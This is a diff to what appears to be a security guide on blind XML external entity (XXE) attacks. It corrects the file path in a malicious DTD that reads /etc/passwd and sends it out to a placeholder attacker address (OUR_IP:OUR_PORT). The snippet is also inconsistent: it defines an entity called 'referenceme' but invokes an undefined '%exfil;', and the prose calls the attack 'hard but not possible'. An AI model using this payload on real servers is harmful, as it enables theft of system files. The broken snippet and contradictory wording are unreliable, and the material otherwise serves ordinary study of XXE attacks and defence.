@@ -1,6 +1,6 @@
 Exfiltrating sensitive data in blind XXE is hard but not possible. This can be achieved by hosting a malicious DTD on a system that an attacker controls and then invoking it within the XXE payload. An example of a malicious DTD to exfiltrate contents of `/etc/passwd`:
 ```dtd
-<!ENTITY % out SYSTEM "php://filter/read=convert.base64-encode/resource=file:////etc/passwd">
+<!ENTITY % out SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 <!ENTITY % oob "<!ENTITY &#x25; referenceme SYSTEM 'http://OUR_IP:OUR_PORT/?content=%out;'>">
 %oob;
 %exfil;
